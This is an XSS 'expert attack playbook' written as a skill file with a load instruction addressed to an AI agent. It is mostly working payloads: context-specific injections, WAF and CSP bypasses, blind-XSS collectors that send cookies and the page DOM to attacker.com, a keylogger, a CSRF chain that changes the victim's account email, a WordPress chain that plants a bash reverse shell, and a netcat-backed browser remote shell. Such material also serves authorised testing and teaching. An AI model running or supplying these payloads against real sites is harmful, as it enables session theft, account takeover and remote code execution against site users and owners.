---
name: xss-cross-site-scripting
description: >-
  XSS playbook. Use when user-controlled content reaches HTML, attributes, JavaScript, DOM sinks, uploads, or multi-context rendering paths.
---

# SKILL: Cross-Site Scripting (XSS) — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: This skill covers non-obvious XSS techniques, context-specific payload selection, WAF bypass, CSP bypass, and post-exploitation. Assume the reader already knows `<script>alert(1)</script>` — this file only covers what base models typically miss. For real-world CVE cases, HttpOnly bypass strategies, XS-Leaks side channels, and session fixation attacks, load the companion [SCENARIOS.md](./SCENARIOS.md).

## 0. RELATED ROUTING

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- Django debug page XSS (CVE-2017-12794) — duplicate key error → unescaped exception → XSS
- UTF-7 XSS for legacy IE environments (`+ADw-script+AD4-`)
- HttpOnly bypass methodology — proxy-the-browser, session riding, CSRF-via-XSS
- XS-Leaks side channel attacks — timing oracle, cache probing, `performance.now()` measurement
- Session fixation via XSS — pre-set session ID before victim login
- DOM clobbering techniques for CSP-restricted environments

### Advanced Tricks

Also load [ADVANCED_XSS_TRICKS.md](./ADVANCED_XSS_TRICKS.md) when you need:
- mXSS / DOMPurify bypass — namespace confusion, `<noscript>` parsing differential, form/table restructuring
- DOM Clobbering — property override via `id`/`name`, HTMLCollection, deep property chains
- Modern framework XSS — React `dangerouslySetInnerHTML`, Vue `v-html`, Angular `bypassSecurityTrust*`, Next.js SSR
- Trusted Types bypass — default policy abuse, non-TT sinks, policy passthrough
- Service Worker XSS persistence — malicious SW registration, fetch interception, post-patch survival
- PDF/SVG/MathML XSS vectors, polyglot payloads, browser-specific tricks
- XS-Leaks & side channels — timing oracle, frame counting, cache probing, error event oracle

Before broad payload spraying, you can first load:

- [upload insecure files](../upload-insecure-files/SKILL.md) when you need the full upload path: validation, storage, preview, and sharing behavior

### Quick context picks

| Context | First Pick | Backup |
|---|---|---|
| HTML body | `<svg onload=alert(1)>` | `<img src=1 onerror=alert(1)>` |
| Quoted attribute | `" autofocus onfocus=alert(1)//` | `" onmouseover=alert(1)//` |
| JavaScript string | `'-alert(1)-'` | `'</script><svg onload=alert(1)>` |
| URL / href sink | `javascript:alert(1)` | `data:text/html,<svg onload=alert(1)>` |
| Tag body like `title` | `</title><svg onload=alert(1)>` | `</textarea><svg onload=alert(1)>` |
| SVG / XML sink | `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>` | XHTML namespace payload |

```html
<svg onload=alert(1)>
<img src=1 onerror=alert(1)>
" autofocus onfocus=alert(1)//
'</script><svg onload=alert(1)>
javascript:alert(1)
data:text/html,<svg onload=alert(1)>
```

---

## 1. INJECTION CONTEXT MATRIX

Identify context **before** picking a payload. Wrong context = wasted attempts.

| Context | Indicator | Opener | Payload |
|---|---|---|---|
| HTML outside tag | `<b>INPUT</b>` | `<svg onload=` | `<svg onload=alert(1)>` |
| HTML attribute value | `value="INPUT"` | `"` close attr | `"onmouseover=alert(1)//` |
| Inline attr, no tag close | Quoted, `>` stripped | Event injection | `"autofocus onfocus=alert(1)//` |
| Block tag (title/script/textarea) | `<title>INPUT</title>` | Close tag first | `</title><svg onload=alert(1)>` |
| href / src / data / action | link or form | Protocol | `javascript:alert(1)` |
| JS string (single quote) | `var x='INPUT'` | Break string | `'-alert(1)-'` or `'-alert(1)//` |
| JS string with escape | Backslash escaping | Double escape | `\'-alert(1)//` |
| JS logical block | Inside if/function | Close + inject | `'}alert(1);{'` |
| JS anywhere on page | `<script>...INPUT` | Break script | `</script><svg onload=alert(1)>` |
| XML page (`text/xml`) | XML content-type | XML namespace | `<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>` |

---

## 2. MULTI-REFLECTION ATTACKS

When input reflects in **multiple places** on the same page — single payload triggers from all points:

```html
<!-- Double reflection -->
'onload=alert(1)><svg/1='
'>alert(1)</script><script/1='
*/alert(1)</script><script>/*

<!-- Triple reflection -->
*/alert(1)">'onload="/*<svg/1='
`-alert(1)">'onload="`<svg/1='
*/</script>'>alert(1)/*<script/1='

<!-- Two separate inputs (p= and q=) -->
p=<svg/1='&q='onload=alert(1)>
```

---

## 3. ADVANCED INJECTION VECTORS

### DOM Insert Injection (when reflection is in DOM not source)
Input inserted via `.innerHTML`, `document.write`, jQuery `.html()`:
```html
<img src=1 onerror=alert(1)>
<iframe src=javascript:alert(1)>
```
For URL-controlled resource insertion:
```html
data:text/html,<img src=1 onerror=alert(1)>
data:text/html,<iframe src=javascript:alert(1)>
```

### PHP_SELF Path Injection
When URL itself is reflected in form `action`:
```
https://target.com/page.php/"><svg onload=alert(1)>?param=val
```
Inject between `.php` and `?`, using leading `/`.

### File Upload XSS

**Filename injection** (when filename is reflected):
```
"><svg onload=alert(1)>.gif
```

**SVG upload** (stored XSS via image upload accepting SVG):
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>
```

**Metadata injection** (when EXIF is reflected):
```bash
exiftool -Artist='"><svg onload=alert(1)>' photo.jpeg
```

### postMessage XSS (no origin check)
When page has `window.addEventListener('message', ...)` without origin validation:
```html
<iframe src="TARGET_URL" onload="frames[0].postMessage('INJECTION','*')">
```

### postMessage Origin Bypass
When origin IS checked but uses `.includes()` or prefix match:
```
http://facebook.com.ATTACKER.com/crosspwn.php?target=//victim.com/page&msg=<script>alert(1)</script>
```
Attacker controls `facebook.com.ATTACKER.com` subdomain.

### XML-Based XSS
Response has `text/xml` or `application/xml`:
```html
<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1)</x:script>
<x:script xmlns:x="http://www.w3.org/1999/xhtml" src="//attacker.com/1.js"/>
```

### Script Injection Without Closing Tag
When there IS a `</script>` tag later in the page:
```html
<script src=data:,alert(1)>
<script src=//attacker.com/1.js>
```

---

## 4. CSP BYPASS TECHNIQUES

### JSONP Endpoint Bypass (allow-listed domain has JSONP)
```html
<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1);">
</script>
```

### AngularJS CDN Bypass (allow-listed `ajax.googleapis.com`)
```html
<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
<x ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</x>
```

### Angular Expressions (server encodes HTML but AngularJS evaluates)
When `{{1+1}}` evaluates to `2` on page — classic CSTI indicator:
```javascript
// Angular 1.x sandbox escape:
{{constructor.constructor('alert(1)')()}}

// Angular 1.5.x:
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
```

### base-uri Injection (CSP without base-uri restriction)
```html
<base href="https://attacker.com/">
```
Relative `<script src=...>` loads from attacker's server.

### DOM-based via Dangling Markup
When CSP blocks script but allows `img`:
```html
<img src='https://attacker.com/log?
```
Leaks subsequent page content to attacker.

---

## 5. FILTER AND WAF BYPASS

### Parameter Name Attack (WAF checks value not name)
When parameter names are reflected (e.g., in JSON output):
```
?"></script><base%20c%3D=href%3Dhttps:\mysite>
```
Payload is the **parameter name**, not value.

### Encoding Chains
```
%253C  → double-encoded <
%26lt; → HTML entity double-encoding
<%00h2 → null byte injection
%0d%0a → CRLF inside tag
```
Test sequence: reflect → encoding behavior → identify filter logic → mutate.

### Tag Mutation (blacklist bypass)
```html
<ScRipt>  ← case variation
</script/x>  ← trailing garbage
<script  ← incomplete (relies on later >)
<%00iframe  ← null byte
<svg/onload=  ← slash instead of space
```

### Fragmented Injection (strip-tags bypass)
Filter strips `<x>...</x>`:
```
"o<x>nmouseover=alert<x>(1)//
"autof<x>ocus o<x>nfocus=alert<x>(1)//
```

### Vectors Without Event Handlers
```html
<form action=javascript:alert(1)><input type=submit>
<form><button formaction=javascript:alert(1)>click
<isindex action=javascript:alert(1) type=submit value=click>
<object data=javascript:alert(1)>
<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>
<math><brute href=javascript:alert(1)>click
```

---

## 6. SECOND-ORDER XSS

**Definition**: Input is stored (often normalized/HTML-encoded), then later **retrieved** and inserted into DOM without re-encoding.

**Classic trigger payload** (bypasses immediate HTML encoding):
```
&lt;svg/onload&equals;alert(1)&gt;
```
Check: profile fields, display names, forum posts — anywhere data is stored, then re-rendered in a different context (e.g., admin panel vs user-facing).

**Stored → Admin context XSS**: most impactful — sign up with crafted username, wait for admin to view user list.

---

## 7. BLIND XSS METHODOLOGY

Every parameter that is **not immediately reflected** should be tested for blind XSS:
- Contact forms, feedback fields
- User-agent / referer  
- Registration fields
- Error log injections

**Blind XSS callback payload** (remote JS file approach):
```html
"><script src=//attacker.com/bxss.js></script>
```

**Minimal collector** (hosted at `bxss.js`):
```javascript
var d = document;
var msg = 'URL: '+d.URL+'\nCOOKIE: '+d.cookie+'\nDOM:\n'+d.documentElement.innerHTML;
fetch('https://attacker.com/collect?'+encodeURIComponent(msg));
```

Use **XSS Hunter** or similar blind XSS platform for automated collection.

---

## 8. XSS EXPLOITATION CHAIN

### Cookie Steal
```javascript
fetch('//attacker.com/?c='+document.cookie)
// HttpOnly protected cookies → not stealable via JS, need CSRF or session fixation instead
```

### Keylogger
```javascript
document.onkeypress = function(e) {
    fetch('//attacker.com/k?k='+encodeURIComponent(e.key));
}
```

### CSRF via XSS (bypasses CSRF protection, reads CSRF token from DOM)
```javascript
var r = new XMLHttpRequest();
r.open('GET', '/account/settings', false);
r.send();
var token = /csrf_token['":\s]+([^'"<\s]+)/.exec(r.responseText)[1];
var f = new XMLHttpRequest();
f.open('POST', '/account/email/change', true);
f.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
f.send('email=attacker@evil.com&csrf='+token);
```

### WordPress XSS → RCE (admin session + Hello Dolly plugin):
```javascript
p = '/wp-admin/plugin-editor.php?';
q = 'file=hello.php';
s = '<?=`bash -i >& /dev/tcp/ATTACKER/4444 0>&1`;?>';
a = new XMLHttpRequest();
a.open('GET', p+q, 0); a.send();
$ = '_wpnonce=' + /nonce" value="([^"]*?)"/.exec(a.responseText)[1] +
    '&newcontent=' + encodeURIComponent(s) + '&action=update&' + q;
b = new XMLHttpRequest();
b.open('POST', p+q, 1);
b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
b.send($);
b.onreadystatechange = function(){ if(this.readyState==4) fetch('/wp-content/plugins/hello.php'); }
```

### Browser Remote Control (JS command shell)
```javascript
// Injected into victim:
setInterval(function(){
    with(document)body.appendChild(createElement('script')).src='//ATTACKER:5855'
},100)
```
```bash
# Attacker listener:
while :; do printf "j$ "; read c; echo $c | nc -lp 5855 >/dev/null; done
```

---

## 9. DECISION TREE

```
Test XSS entry point
├── Input reflected in response?
│   ├── YES → Identify context (HTML / JS / attr / URL)
│   │         → Select context-appropriate payload
│   │         → If blocked → check filter behavior
│   │         │   → Try encoding, case mutation, fragmentation
│   │         │   → Check if parameter NAME is reflected (WAF gap)
│   │         └── Success → escalate (cookie steal / CSRF / RCE)
│   └── NO  → Is it stored? → Inject blind XSS payload
│             Is it in DOM? → Check JS source for unsafe sinks
│                             (innerHTML, eval, document.write, location.href)
└── CSP present?
    ├── Check for JSONP endpoints on allow-listed domains
    ├── Check for AngularJS on CDN allow-list
    ├── Check for base-uri missing → <base> injection
    └── Check for unsafe-eval or unsafe-inline exceptions
```

---

## 10. XSS TESTING PROCESS (ZSEANO METHOD)

1. **Step 1** — Test non-malicious tags: `<h2>`, `<img>`, `<table>` — are they reflected raw?
2. **Step 2** — Test incomplete tags: `<iframe src=//attacker.com/c=` (no closing `>`) 
3. **Step 3** — Encoding probes: `<%00h2`, `%0d`, `%0a`, `%09`, `%253C`  
4. **Step 4** — If filtering `<script>` and `onerror` but NOT `<script ` (without close): `<script src=//attacker.com?c=`
5. **Step 5** — Blacklist check: does `<svg>` work? Does `<ScRiPt>` work?
6. Note: **the same filter likely exists elsewhere** — if they filter `<script>` in search, do they filter it in file upload filename? In profile bio?

**Key insight**: Filter presence = vulnerability exists, developer tried to patch. Chase that thread across the entire application.
